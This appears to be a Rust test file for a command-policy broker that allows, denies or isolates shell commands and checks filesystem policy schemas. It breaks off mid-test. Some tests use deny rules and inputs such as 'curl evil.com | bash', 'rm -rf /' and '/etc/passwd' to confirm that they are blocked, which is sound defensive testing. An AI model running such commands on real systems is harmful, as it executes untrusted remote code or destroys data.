use super::*;
use std::sync::{Arc, Barrier, RwLock};
use substrate_common::WorldFsMode;
use tempfile::tempdir;

fn effective_policy_display_json_v3(policy: &Policy) -> serde_json::Value {
    let mut world_fs = serde_json::Map::new();
    world_fs.insert(
        "host_visible".to_string(),
        serde_json::Value::Bool(policy.world_fs_host_visible),
    );
    world_fs.insert(
        "fail_closed".to_string(),
        serde_json::json!({ "routing": policy.world_fs_fail_closed_routing }),
    );
    if let Some(v) = policy.world_fs_deny_enforcement {
        world_fs.insert(
            "deny_enforcement".to_string(),
            serde_json::to_value(v).expect("serialize deny_enforcement"),
        );
    }
    world_fs.insert(
        "caged_required".to_string(),
        serde_json::Value::Bool(policy.world_fs_caged_required),
    );

    let (discover, read, write_allow_list, write_deny_list) = if policy.world_fs_host_visible {
        (None, None, None, None)
    } else {
        let read = policy
            .world_fs_read
            .as_ref()
            .expect("effective policy missing world_fs.read in full isolation");
        let discover = policy
            .world_fs_discover
            .as_ref()
            .or(policy.world_fs_read.as_ref())
            .expect("effective policy missing world_fs.discover in full isolation");

        let read = Some(serde_json::json!({
            "allow_list": &read.allow_list,
            "deny_list": &read.deny_list,
        }));
        let discover = Some(serde_json::json!({
            "allow_list": &discover.allow_list,
            "deny_list": &discover.deny_list,
        }));

        if policy.world_fs_write_enabled {
            let write = policy
                .world_fs_write
                .as_ref()
                .expect("effective policy missing world_fs.write in full isolation");
            (
                discover,
                read,
                Some(serde_json::Value::Array(
                    write
                        .allow_list
                        .iter()
                        .cloned()
                        .map(serde_json::Value::String)
                        .collect(),
                )),
                Some(serde_json::Value::Array(
                    write
                        .deny_list
                        .iter()
                        .cloned()
                        .map(serde_json::Value::String)
                        .collect(),
                )),
            )
        } else {
            // When writes are disabled, keep the V3 shape stable by rendering empty lists.
            (
                discover,
                read,
                Some(serde_json::Value::Array(Vec::new())),
                Some(serde_json::Value::Array(Vec::new())),
            )
        }
    };

    if let Some(v) = discover {
        world_fs.insert("discover".to_string(), v);
    }
    if let Some(v) = read {
        world_fs.insert("read".to_string(), v);
    }

    let mut write = serde_json::Map::new();
    write.insert(
        "enabled".to_string(),
        serde_json::Value::Bool(policy.world_fs_write_enabled),
    );
    if let Some(v) = write_allow_list {
        write.insert("allow_list".to_string(), v);
    }
    if let Some(v) = write_deny_list {
        write.insert("deny_list".to_string(), v);
    }
    world_fs.insert("write".to_string(), serde_json::Value::Object(write));

    serde_json::json!({
        "id": &policy.id,
        "name": &policy.name,
        "world_fs": serde_json::Value::Object(world_fs),
        "llm": {
            "fail_closed": {
                "routing": policy.llm_fail_closed_routing,
            },
            "require_approval": policy.llm_require_approval,
            "allowed_backends": &policy.llm_allowed_backends,
            "constraints": {
                "routers": &policy.llm_constraints_routers,
                "providers": &policy.llm_constraints_providers,
                "protocols": &policy.llm_constraints_protocols,
                "auth_authorities": &policy.llm_constraints_auth_authorities,
            },
            "secrets": {
                "env_allowed": &policy.llm_secrets_env_allowed,
            },
        },
        "agents": {
            "allowed_backends": &policy.agents_allowed_backends,
            "fail_closed": {
                "routing": policy.agents_fail_closed_routing,
            },
            "host_credentials": {
                "read": {
                    "allowed_backends": &policy.agents_host_credentials_read_allowed_backends,
                },
            },
            "world_dispatch": {
                "enabled": policy.agents_world_dispatch_enabled,
                "allowed_backends": &policy.agents_world_dispatch_allowed_backends,
                "allowed_actions": &policy.agents_world_dispatch_allowed_actions,
                "allowed_modes": &policy.agents_world_dispatch_allowed_modes,
                "same_session_only": policy.agents_world_dispatch_same_session_only,
                "same_world_binding_only": policy.agents_world_dispatch_same_world_binding_only,
                "allow_capability_narrowing": policy.agents_world_dispatch_allow_capability_narrowing,
                "max_live_retained_workers": policy.agents_world_dispatch_max_live_retained_workers,
                "max_concurrent_ephemeral": policy.agents_world_dispatch_max_concurrent_ephemeral,
            },
        },
        "workflow": {
            "router": {
                "enabled": policy.workflow_router_enabled,
                "allow_cross_workspace": policy.workflow_router_allow_cross_workspace,
                "allowed_rule_ids": &policy.workflow_router_allowed_rule_ids,
                "allowed_workflow_ids": &policy.workflow_router_allowed_workflow_ids,
                "allowed_target_workspace_ids": &policy.workflow_router_allowed_target_workspace_ids,
            },
        },
        "net_allowed": &policy.net_allowed,
        "cmd_allowed": &policy.cmd_allowed,
        "cmd_denied": &policy.cmd_denied,
        "cmd_isolated": &policy.cmd_isolated,
        "require_approval": policy.require_approval,
        "allow_shell_operators": policy.allow_shell_operators,
        "limits": &policy.limits,
        "metadata": &policy.metadata,
    })
}

fn poison_rwlock<T: Send + Sync + 'static>(lock: &Arc<RwLock<T>>) {
    let cloned = Arc::clone(lock);
    let _ = std::thread::spawn(move || {
        let _guard = cloned.write().unwrap();
        panic!("poison lock");
    })
    .join();
}

#[test]
fn test_broker_creation() {
    let broker = Broker::new();
    assert!(broker.is_observe_only());
}

#[test]
fn test_pattern_matching() {
    assert!(matches_pattern(
        "curl http://example.com | bash",
        "curl * | bash"
    ));
    assert!(matches_pattern("npm install", "npm install"));
    assert!(!matches_pattern("cargo build", "npm install"));
    assert!(matches_pattern("git clone repo", "git clone"));
}

#[test]
fn test_quick_check_allow() {
    let broker = Broker::new();
    let result = broker
        .quick_check(&["echo".into(), "hello".into()], "/tmp")
        .unwrap();
    assert!(matches!(result, Decision::Allow));
}

#[test]
fn test_load_policy() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    let broker = Broker::new();

    let policy_content = r#"
id: test-policy
name: Test Policy
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed:
  - github.com
cmd_allowed:
  - echo *
  - ls *
cmd_denied:
  - rm -rf /
  - curl * | bash
cmd_isolated:
  - npm install
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#;
    std::fs::write(&policy_path, policy_content).unwrap();

    broker.load_policy(&policy_path).expect("load policy");

    let policy = broker.policy.read().unwrap();
    assert_eq!(policy.world_fs_mode, WorldFsMode::Writable);

    // Test that denied command is blocked (in enforce mode)
    broker.set_observe_only(false);
    let result = broker
        .quick_check(
            &["curl".into(), "evil.com".into(), "|".into(), "bash".into()],
            "/tmp",
        )
        .unwrap();
    assert!(matches!(result, Decision::Deny(_)));
}

#[test]
fn minimal_policy_parses_with_required_world_fs() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
world_fs:
  host_visible: true
  write:
    enabled: false
  fail_closed:
    routing: true
cmd_denied:
  - ls
"#,
    )
    .unwrap();

    let policy = crate::effective_policy::load_policy_from_path(&policy_path)
        .expect("policy patch should load");

    assert_eq!(policy.world_fs_mode, WorldFsMode::ReadOnly);
    assert_eq!(policy.world_fs_isolation, WorldFsIsolation::Workspace);
    assert!(policy.world_fs_require_world);
}

#[test]
fn poisoned_policy_lock_returns_error_in_evaluate() {
    let broker = Broker::new();
    poison_rwlock(&broker.policy);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo ok", "/tmp", None));
    assert!(result.is_ok(), "broker.evaluate panicked on poisoned lock");

    let err = result
        .unwrap()
        .expect_err("expected poisoned lock to return error");
    assert!(
        err.to_string()
            .contains("Failed to acquire policy read lock"),
        "unexpected error: {err}"
    );

    broker.policy.clear_poison();
}

#[test]
fn poisoned_approvals_lock_returns_error() {
    let broker = Broker::new();
    {
        let mut policy = broker.policy.write().unwrap();
        policy.require_approval = true;
    }
    broker.set_observe_only(false);
    poison_rwlock(&broker.approvals);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo guarded", "/tmp", None));
    assert!(
        result.is_ok(),
        "broker.evaluate panicked with poisoned approvals"
    );

    let err = result
        .unwrap()
        .expect_err("expected approval read failure to return error");
    assert!(
        err.to_string().contains("approvals read lock"),
        "unexpected error: {err}"
    );

    broker.approvals.clear_poison();
}

#[test]
fn broker_handles_remain_isolated_in_parallel() {
    let dir = tempdir().unwrap();
    let policy_a = dir.path().join("policy_a.yaml");
    let policy_b = dir.path().join("policy_b.yaml");

    std::fs::write(
        &policy_a,
        r#"
id: alpha
name: Alpha Policy
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed: []
cmd_allowed:
  - alpha-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    std::fs::write(
        &policy_b,
        r#"
id: beta
name: Beta Policy
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed: []
cmd_allowed:
  - beta-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    let broker_a = BrokerHandle::new();
    broker_a.initialize(Some(&policy_a)).unwrap();
    broker_a.set_observe_only(false);

    let broker_b = BrokerHandle::new();
    broker_b.initialize(Some(&policy_b)).unwrap();

    assert!(
        broker_b.is_observe_only(),
        "changing one broker handle should not affect another"
    );
    broker_b.set_observe_only(false);

    let barrier = Arc::new(Barrier::new(2));
    let thread_a = {
        let barrier = barrier.clone();
        let broker = broker_a.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("alpha-allowed", "/tmp", None)
        })
    };

    let thread_b = {
        let barrier = barrier.clone();
        let broker = broker_b.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("beta-allowed", "/tmp", None)
        })
    };

    let decision_a = thread_a.join().expect("thread a panicked").unwrap();
    let decision_b = thread_b.join().expect("thread b panicked").unwrap();

    assert!(matches!(decision_a, Decision::Allow));
    assert!(matches!(decision_b, Decision::Allow));

    assert!(matches!(
        broker_a
            .evaluate("beta-allowed", "/tmp", None)
            .expect("evaluate beta on broker_a"),
        Decision::Deny(_)
    ));
    assert!(matches!(
        broker_b
            .evaluate("alpha-allowed", "/tmp", None)
            .expect("evaluate alpha on broker_b"),
        Decision::Deny(_)
    ));
}

#[test]
fn invalid_world_fs_mode_in_policy_surfaces_error() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
id: bad-fs-mode
name: Invalid fs mode
world_fs:
  mode: invalid
net_allowed: []
cmd_allowed: []
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {}
"#,
    )
    .unwrap();

    let broker = Broker::new();
    let result = broker.load_policy(&policy_path);
    assert!(
        result.is_err(),
        "expected invalid world_fs.mode to fail parsing"
    );
}

mod wfgad0_policy_schema_v2 {
    use super::*;

    fn load_policy_from_yaml(raw: &str) -> anyhow::Result<Policy> {
        let dir = tempdir().expect("tempdir");
        let policy_path = dir.path().join("policy.yaml");
        std::fs::write(&policy_path, raw).expect("write policy.yaml");
        crate::effective_policy::load_policy_from_path(&policy_path)
    }

    fn expect_err(raw: &str) -> String {
        load_policy_from_yaml(raw)
            .expect_err("expected policy patch to be rejected")
            .to_string()
    }

    fn expect_err_contains(raw: &str, needle: &str) {
        let err = expect_err(raw);
        assert!(
            err.contains(needle),
            "expected error to contain {needle:?}, got: {err}"
        );
    }

    #[test]
    fn rejects_legacy_world_fs_allowlist_keys() {
        // R-001: breaking schema; legacy keys must hard error.
        expect_err_contains(
            r#"
world_fs:
  read_allowlist: ["*"]
  write_allowlist: []
"#,
            "read_allowlist",
        );
    }

    #[test]
    fn rejects_unknown_world_dispatch_actions_with_packet_one_allowlist() {
        let err = expect_err(
            r#"
agents:
  world_dispatch:
    allowed_actions:
      - stop_world_worker
"#,
        );
        assert!(
            err.contains("agents.world_dispatch.allowed_actions"),
            "expected world dispatch action diagnostic, got: {err}"
        );
        assert!(
            err.contains("inspect_world_worker"),
            "expected Packet 1 inspect action in diagnostic, got: {err}"
        );
    }

    #[test]
    fn rejects_legacy_isolation_project_value() {
        // R-001: breaking schema; legacy values must hard error (only workspace|full allowed).
        expect_err_contains(
            r#"
world_fs:
  isolation: project
"#,
            "isolation",
        );
    }

    #[test]
    fn denies_and_enforcement_are_rejected_in_workspace_isolation() {
        // SCHEMA.md §1.5.2: full-isolation-only keys must be omitted when host_visible=true.
        let err = expect_err(
            r#"
world_fs:
  host_visible: true
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#,
        );
        assert!(
            err.contains("host_visible") || err.contains("read"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn allow_list_must_be_present_and_non_empty() {
        // SCHEMA.md §1.4 + §1.5.3: allow_list must be non-empty after defaulting.
        // Empty lists should be defaulted deterministically in full isolation.
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: []
    deny_list: []
"#,
        );
        let policy = policy.expect("expected empty allow_list to be defaulted in full isolation");
        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be present in full isolation");
        assert_eq!(read.allow_list, vec![".".to_string()]);
    }

    #[test]
    fn allow_list_rejects_glob_metacharacters() {
        // R-004: allow_list must not contain glob metacharacters (* ? [ ]).
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["src/**"]
    deny_list: []
"#,
        );
    }

    #[test]
    fn deny_list_rejects_unsupported_glob_metacharacters() {
        // R-004: deny_list supports only * and ** wildcards; ? and [...] must hard error.
        expect_err(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["file?.txt"]
"#,
        );
        expect_err(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["file[0-9].txt"]
"#,
        );
    }

    #[test]
    fn patterns_must_be_project_root_relative() {
        // R-004: absolute paths and any ".." segment must hard error.
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["/etc/passwd"]
    deny_list: []
"#,
        );
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["../secrets"]
    deny_list: []
"#,
        );
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["a/../b"]
    deny_list: []
"#,
        );
    }

    #[test]
    fn enforcement_must_be_present_iff_any_deny_list_is_non_empty() {
        // SCHEMA.md §1.5.4: deny_enforcement is required when any deny_list is non-empty.
        expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#,
        );

        // deny_enforcement MAY be present even when all deny_list values are empty.
        load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: strict
  read:
    allow_list: ["."]
    deny_list: []
"#,
        )
        .expect("expected deny_enforcement to be allowed with empty denies");
    }

    #[test]
    fn accepts_normalized_literals_and_wildcard_denies_in_full_isolation() {
        // R-004: leading "./" and trailing "/" are normalized (accepted) and semantics are deterministic.
        // Also validates that a minimal full-isolation deny configuration is accepted when consistent.
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  deny_enforcement: weak
  read:
    allow_list: ["./src/"]
    deny_list: ["./secrets/", "**/*.pem"]
"#,
        )
        .expect("expected a valid v3 full isolation deny configuration to load");
        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be present");
        assert_eq!(read.allow_list, vec!["src".to_string()]);
        assert_eq!(
            read.deny_list,
            vec!["secrets".to_string(), "**/*.pem".to_string()]
        );
    }

    #[test]
    fn writable_full_isolation_defaults_read_allow_list_from_write_when_missing() {
        // SCHEMA.md §1.4: read.allow_list defaults to ["."], independent of write.allow_list.
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
  write:
    allow_list: ["./outputs/private/"]
"#,
        )
        .expect("expected writable full isolation policy to load");

        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be present in full isolation");
        assert_eq!(read.allow_list, vec![".".to_string()]);

        let write = policy
            .world_fs_write
            .as_ref()
            .expect("write dimension should be present when write.enabled=true");
        assert_eq!(write.allow_list, vec!["outputs/private".to_string()]);
    }
}

mod wfgadax0_policy_schema_v3 {
    use super::*;

    fn load_policy_from_yaml(raw: &str) -> anyhow::Result<Policy> {
        let dir = tempdir().expect("tempdir");
        let policy_path = dir.path().join("policy.yaml");
        std::fs::write(&policy_path, raw).expect("write policy.yaml");
        crate::effective_policy::load_policy_from_path(&policy_path)
    }

    fn expect_err(raw: &str) -> String {
        load_policy_from_yaml(raw)
            .expect_err("expected policy patch to be rejected")
            .to_string()
    }

    fn expect_err_contains(raw: &str, needle: &str) {
        let err = expect_err(raw);
        assert!(
            err.contains(needle),
            "expected error to contain {needle:?}, got: {err}"
        );
    }

    #[test]
    fn wfgadax0_rejects_replaced_world_fs_keys_mode_isolation_require_world_enforcement() {
        // SCHEMA.md §1.2: Appendix A schema is breaking; replaced keys MUST hard error (exit 2).
        //
        // This test uses a previously-valid V2 config; under V3 it must be rejected deterministically.
        let raw = r#"
world_fs:
  mode: read_only
  isolation: full
  require_world: true
  enforcement: strict
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#;
        let err = expect_err(raw);
        assert!(
            err.contains("world_fs.mode")
                || err.contains("world_fs.isolation")
                || err.contains("world_fs.require_world")
                || err.contains("world_fs.enforcement")
                || err.contains("mode")
                || err.contains("isolation")
                || err.contains("require_world")
                || err.contains("enforcement"),
            "expected a replaced-key diagnostic, got: {err}"
        );
    }

    #[test]
    fn wfgadax0_accepts_host_visible_true_with_no_full_isolation_dimensions() {
        // SCHEMA.md §1.4: host_visible defaults true; §1.5.2: full-isolation-only keys must be omitted.
        load_policy_from_yaml(
            r#"
world_fs:
  host_visible: true
"#,
        )
        .expect("expected minimal host_visible=true policy patch to load");
    }

    #[test]
    fn wfgadax0_defaults_full_isolation_dimensions_deterministically_when_host_visible_false() {
        // SCHEMA.md §1.4 defaults:
        // - host_visible=false => full isolation
        // - read.allow_list defaults to ["."]
        // - write.enabled defaults true and write.allow_list defaults to ["."]
        // - deny_list defaults to []
        // - discover defaults to read when omitted
        let policy = load_policy_from_yaml(
            r#"
world_fs:
  host_visible: false
"#,
        )
        .expect("expected minimal host_visible=false policy patch to load");

        let read = policy
            .world_fs_read
            .as_ref()
            .expect("read dimension should be defaulted in full isolation");
        assert_eq!(read.allow_list, vec![".".to_string()]);
        assert!(read.deny_list.is_empty());

        let discover = policy
            .world_fs_discover
            .as_ref()
            .expect("discover dimension should default to read in full isolation");
        assert_eq!(discover.allow_list, vec![".".to_string()]);
        assert!(discover.deny_list.is_empty());

        let write = policy
            .world_fs_write
            .as_ref()
            .expect("write dimension should be present by default when write.enabled=true");
        assert_eq!(write.allow_list, vec![".".to_string()]);
        assert!(write.deny_list.is_empty());
    }

    #[test]
    fn wfgadax0_rejects_full_isolation_keys_when_host_visible_true() {
        // SCHEMA.md §1.5.2: If host_visible=true, read/discover/write.allow_list/deny_list MUST be omitted.
        // Assert a deterministic diagnostic that mentions both host_visible and the offending key.
        expect_err_contains(
            r#"
world_fs:
  host_visible: true
  read:
    allow_list: ["."]
"#,
            "host_visible",
        );
        expect_err_contains(
            r#"
world_fs:
  host_visible: true
  read:
    allow_list: ["."]
"#,
            "read",
        );
    }

    #[test]
    fn wfgadax0_requires_deny_enforcement_when_any_deny_list_is_non_empty() {
        // SCHEMA.md §1.5.4: deny_enforcement MUST be present iff any deny_list is non-empty.
        let err = expect_err(
            r#"
world_fs:
  host_visible: false
  read:
    allow_list: ["."]
    deny_list: ["secrets/**"]
"#,
        );
        assert!(
            err.contains("deny_enforcement"),
            "expected deny_enforcement diagnostic, got: {err}"
        );
    }

    #[test]
    fn wfgadax0_write_disabled_requires_fail_closed_routing_true() {
        // SCHEMA.md §1.5.1: If write.enabled=false, fail_closed.routing MUST be true.
        let err = expect_err(
            r#"
world_fs:
  host_visible: false
  write:
    enabled: false
  fail_closed:
    routing: false
"#,
        );
        assert!(
            err.contains("write") && err.contains("fail_closed"),
            "expected write.enabled/fail_closed.routing diagnostic, got: {err}"
        );
    }
}

mod c0_policy_patch_only_broker_effective_resolution {
    use crate::{validate_dotted_id, validate_snake_case_id};
    use serial_test::serial;
    use std::ffi::OsString;
    use std::path::{Path, PathBuf};
    use std::process::Command;
    use std::sync::MutexGuard;
    use std::sync::OnceLock;
    use tempfile::{Builder, TempDir};

    struct EnvVarGuard {
        _lock: MutexGuard<'static, ()>,
        key: &'static str,
        prev: Option<OsString>,
    }

    impl EnvVarGuard {
        fn set(key: &'static str, value: impl AsRef<Path>) -> Self {
            let lock = crate::test_utils::env_lock()
                .lock()
                .unwrap_or_else(|err| err.into_inner());
            let prev = std::env::var_os(key);
            std::env::set_var(key, value.as_ref());
            Self {
                _lock: lock,
                key,
                prev,
            }
        }
    }

    impl Drop for EnvVarGuard {
        fn drop(&mut self) {
            match &self.prev {
                Some(prev) => std::env::set_var(self.key, prev),
                None => std::env::remove_var(self.key),
            }
        }
    }

    fn ensure_substrate_built() {
        static BUILD_ONCE: OnceLock<()> = OnceLock::new();
        BUILD_ONCE.get_or_init(|| {
            if existing_substrate_binary_path().is_some() {
                return;
            }
            let target_dir = c0_target_dir();
            let cargo_root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
            let cargo_bin = std::env::var_os("CARGO").unwrap_or_else(|| OsString::from("cargo"));
            let status = Command::new(cargo_bin)
                .args(["build", "-p", "substrate"])
                .current_dir(&cargo_root)
                .env("CARGO_TARGET_DIR", &target_dir)
                .status()
                .expect("failed to invoke cargo build -p substrate");
            assert!(status.success(), "cargo build -p substrate failed");
        });
    }

    fn c0_target_dir() -> PathBuf {
        let base = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../target/tests-tmp/c0-policy-patch-only-cargo-target");
        std::fs::create_dir_all(&base).expect("failed to create C0 cargo target dir");
        base
    }

    fn substrate_binary_path() -> PathBuf {
        let binary_name = if cfg!(windows) {
            "substrate.exe"
        } else {
            "substrate"
        };

        existing_substrate_binary_path()
            .unwrap_or_else(|| c0_target_dir().join("debug").join(binary_name))
    }

    fn existing_substrate_binary_path() -> Option<PathBuf> {
        let binary_name = if cfg!(windows) {
            "substrate.exe"
        } else {
            "substrate"
        };

        let current_exe = std::env::current_exe().ok()?;
        let debug_dir = current_exe.parent()?.parent()?;
        let sibling = debug_dir.join(binary_name);
        sibling.exists().then_some(sibling)
    }

    fn substrate_cmd(tmpdir: &Path) -> Command {
        ensure_substrate_built();

        let mut cmd = Command::new(substrate_binary_path());
        cmd.env("TMPDIR", tmpdir);
        cmd.env_remove("SHIM_ORIGINAL_PATH");
        cmd.env_remove("SUBSTRATE_WORLD");
        cmd.env_remove("SUBSTRATE_WORLD_ENABLED");
        cmd.env("SUBSTRATE_OVERRIDE_WORLD", "disabled");
        cmd.env_remove("SUBSTRATE_WORLD_ID");
        cmd
    }

    fn temp_dir(prefix: &str) -> TempDir {
        let base = std::env::temp_dir().join("substrate-tests-tmp");
        std::fs::create_dir_all(&base).expect("failed to create shared TMPDIR");
        Builder::new()
            .prefix(prefix)
            .tempdir_in(base)
            .expect("failed to allocate integration test temp dir")
    }

    struct Fixture {
        _temp: TempDir,
        home: PathBuf,
        substrate_home: PathBuf,
        workspace_root: PathBuf,
    }

    impl Fixture {
        fn new() -> Self {
            let temp = temp_dir("c0-policy-patch-only-");
            let home = temp.path().join("home");
            std::fs::create_dir_all(&home).expect("create HOME fixture");
            let substrate_home = temp.path().join("substrate-home");
            std::fs::create_dir_all(&substrate_home).expect("create SUBSTRATE_HOME fixture");
            let workspace_root = temp.path().join("workspace");
            std::fs::create_dir_all(&workspace_root).expect("create workspace root");

            std::fs::create_dir_all(workspace_root.join(".substrate"))
                .expect("create .substrate dir");

            Self {
                _temp: temp,
                home,
                substrate_home,
                workspace_root,
            }
        }

        fn workspace_marker_path(&self) -> PathBuf {
            self.workspace_root
                .join(".substrate")
                .join("workspace.yaml")
        }

        fn workspace_disabled_marker_path(&self) -> PathBuf {
            self.workspace_root
                .join(".substrate")
                .join("workspace.disabled")
        }

        fn workspace_policy_path(&self) -> PathBuf {
            self.workspace_root.join(".substrate").join("policy.yaml")
        }

        fn global_policy_path(&self) -> PathBuf {
            self.substrate_home.join("policy.yaml")
        }

        fn child_dir(&self) -> PathBuf {
            let child = self.workspace_root.join("a/b");
            std::fs::create_dir_all(&child).expect("create child dir");
            child
        }

        fn write_workspace_marker(&self) {
            std::fs::write(self.workspace_marker_path(), "schema_version: 1\n")
                .expect("write workspace.yaml marker");
        }

        fn write_workspace_disabled(&self) {
            std::fs::write(self.workspace_disabled_marker_path(), "")
                .expect("write workspace.disabled marker");
        }

        fn write_global_policy(&self, yaml: &str) {
            std::fs::write(self.global_policy_path(), yaml).expect("write global policy.yaml");
        }

        fn write_workspace_policy(&self, yaml: &str) {
            std::fs::write(self.workspace_policy_path(), yaml)
                .expect("write workspace policy.yaml");
        }

        fn run_substrate(&self, cwd: &Path, args: &[&str]) -> std::process::Output {
            let mut cmd = substrate_cmd(self._temp.path());
            cmd.current_dir(cwd);
            cmd.env("HOME", &self.home);
            cmd.env("USERPROFILE", &self.home);
            cmd.env("SUBSTRATE_HOME", &self.substrate_home);
            cmd.args(args);
            cmd.output().expect("run substrate command")
        }
    }

    fn full_policy_yaml_with_cmd_allowed(policy_id: &str, cmd_allowed: &[&str]) -> String {
        let cmd_allowed_yaml = cmd_allowed
            .iter()
            .map(|s| format!("  - {s}\n"))
            .collect::<String>();
        format!(
            r#"id: "{policy_id}"
name: "{policy_id}"
world_fs:
  host_visible: true
  fail_closed:
    routing: false
  write:
    enabled: true
net_allowed: []
cmd_allowed:
{cmd_allowed_yaml}cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
limits:
  max_memory_mb: null
  max_cpu_percent: null
  max_runtime_ms: null
  max_egress_bytes: null
metadata: {{}}
"#
        )
    }

    fn explain_layers(explain: &serde_json::Value, key: &str) -> Vec<String> {
        explain
            .get("keys")
            .and_then(|value| value.get(key))
            .and_then(|value| value.get("sources"))
            .and_then(|value| value.as_array())
            .unwrap_or_else(|| panic!("missing explain sources for {key}: {explain}"))
            .iter()
            .map(|source| {
                source
                    .get("layer")
                    .and_then(|value| value.as_str())
                    .unwrap_or_else(|| panic!("missing explain layer for {key}: {source}"))
                    .to_string()
            })
            .collect()
    }

    #[test]
    #[serial]
    fn c0_invalid_world_fs_schema_exits_2() {
        // R-016: "Hard error" for invalid policy/config is exit code 2 on the host CLI.
        // R-001: legacy keys must hard error (breaking schema v2).
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        fixture.write_global_policy(
            r#"
world_fs:
  mode: writable
  isolation: workspace
  require_world: false
  read_allowlist: ["*"]
  write_allowlist: []
"#,
        );

        let cwd = fixture.child_dir();
        let output = fixture.run_substrate(&cwd, &["policy", "current", "show", "--json"]);
        assert_eq!(
            output.status.code(),
            Some(2),
            "expected invalid policy schema to exit 2, got: {output:?}"
        );
    }

    #[test]
    #[serial]
    fn c0_cli_policy_current_show_explain_emits_single_json_object_on_stderr() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();

        let cwd = fixture.child_dir();
        let output =
            fixture.run_substrate(&cwd, &["policy", "current", "show", "--json", "--explain"]);
        assert!(
            output.status.success(),
            "expected `substrate policy current show --explain` to succeed: {output:?}"
        );

        let stderr = String::from_utf8_lossy(&output.stderr);
        let explain: serde_json::Value =
            serde_json::from_slice(&output.stderr).unwrap_or_else(|err| {
                panic!(
                    "expected stderr to be a single JSON object (no extra note lines); parse error: {err}; stderr was: {stderr}"
                )
            });
        assert_eq!(
            explain.get("kind").and_then(|v| v.as_str()),
            Some("substrate.policy.explain.v1"),
            "unexpected explain kind: {explain}"
        );
    }

    #[test]
    fn c0_itps0_schema_examples_match_snake_case_and_dotted_id_validators() {
        for value in [
            "substrate_gateway",
            "openai",
            "azure_openai",
            "codex_subscription",
            "openai_api_key",
        ] {
            validate_snake_case_id(value)
                .unwrap_or_else(|err| panic!("expected valid snake_case id {value:?}: {err}"));
        }
        for value in [
            "Substrate_Gateway",
            "openai-responses",
            "_openai",
            "openai__api",
            "openai_",
        ] {
            let err = validate_snake_case_id(value)
                .expect_err("expected invalid snake_case example to fail");
            assert!(
                err.contains("expected lowercase snake_case id"),
                "unexpected snake_case validation error for {value:?}: {err}"
            );
        }

        for value in [
            "openai.responses",
            "openai.chat_completions",
            "anthropic.messages",
            "uaa.agent_session",
        ] {
            validate_dotted_id(value)
                .unwrap_or_else(|err| panic!("expected valid dotted id {value:?}: {err}"));
        }
        for value in [
            "openai",
            "OpenAI.responses",
            "openai..responses",
            "openai.responses_v1.",
            "openai.responses-v1",
        ] {
            let err =
                validate_dotted_id(value).expect_err("expected invalid dotted-id example to fail");
            assert!(
                err.contains("expected lowercase dotted id"),
                "unexpected dotted-id validation error for {value:?}: {err}"
            );
        }
    }

    #[test]
    #[serial]
    fn c0_policy_global_and_workspace_set_accepts_lacp0_keys() {
        let fixture = Fixture::new();
        fixture.write_workspace_marker();
        fixture.write_workspace_policy("{}\n");
        let cwd = fixture.child_dir();

        let global = fixture.run_substrate(
            &cwd,
            &[
                "policy",
                "global",
                "set",
                "--json",
                "llm.allowed_backends=[\"cli:codex\"]",
                "agents.allowed_backends=[\"cli:codex\"]",
                "workflow.router.enabled=true",
                "workflow.router.allowed_rule_ids=[\"rule-global\"]",
            ],
        );
        assert!(
            global.status.success(),
            "policy global set should accept LACP0 keys: {global:?}"
        );
        let global_json: serde_json::Value =
            serde_json::from_slice(&global.stdout).expect("global set JSON parse");
        assert_eq!(
            global_json
                .pointer("/llm/allowed_backends/0")
